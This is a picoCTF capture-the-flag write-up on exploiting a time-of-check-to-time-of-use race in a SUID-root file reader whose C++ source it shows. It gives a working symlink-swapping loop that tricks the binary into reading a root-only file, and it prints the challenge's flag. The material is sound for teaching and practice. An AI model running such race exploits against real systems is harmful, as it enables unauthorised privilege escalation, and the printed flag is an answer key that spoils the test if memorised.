# Lesson
- practicing `TOCTOU` exploitation  
- `ln -sf`  
  - -s: Create a symbolic link.  
  - -f: If the target file or directory already exists, remove it and create the link.  
- `SUID`  
  a kind of permission type  
- `stat()` function from `sys/stat.h` of `c`  
  - point...  
  If the named file is a symbolic link, the stat() function shall continue pathname resolution using the contents of the symbolic link, and shall return information pertaining to the resulting file if the file exists.  
  - https://pubs.opengroup.org/onlinepubs/009696799/functions/stat.html

# Memo
1. analyze  
"txtreader" is owned by "root" and has the SUID bit set, so it runs with "root" privileges even when launched by the low-privilege "ctf-player" account.
```zsh
ctf-player@pico-chall$ whoami
ctf-player
ctf-player@pico-chall$
ctf-player@pico-chall$ ls -la
total 32
drwxr-xr-x 1 ctf-player ctf-player    20 Jan  6 14:06 .
drwxr-xr-x 1 root       root          24 Aug  4 21:50 ..
drwx------ 2 ctf-player ctf-player    34 Jan  6 14:06 .cache
-rw-r--r-- 1 root       root          67 Aug  4 21:52 .profile
-rw------- 1 root       root          32 Aug  4 21:52 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16  2023 src.cpp
-rwsr-xr-x 1 root       root       19016 Aug  4 21:52 txtreader
ctf-player@pico-chall$
```
```zsh
ctf-player@pico-chall$ cat ./src.cpp
```
```c
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

2. exploit
```zsh
ctf-player@pico-chall$ touch dummy
ctf-player@pico-chall$
ctf-player@pico-chall$ for i in {1..10000}; do ln -sf dummy flag; ln -sf flag.txt flag; done &
[1] 37
ctf-player@pico-chall$ for i in {1..10000}; do ./txtreader flag 2>/dev/null; done
picoCTF{ToctoU_!s_3a5y_0490d70a}
picoCTF{ToctoU_!s_3a5y_0490d70a}
picoCTF{ToctoU_!s_3a5y_0490d70a}
picoCTF{ToctoU_!s_3a5y_0490d70a}
```

# Ref
- https://samsclass.info/127/proj/E10.htm  
- https://brandon-t-elliott.github.io/tic-tac  
- https://medium.com/@khanzjoel55/pico-ctf-2023-writeups-a09828def8cc  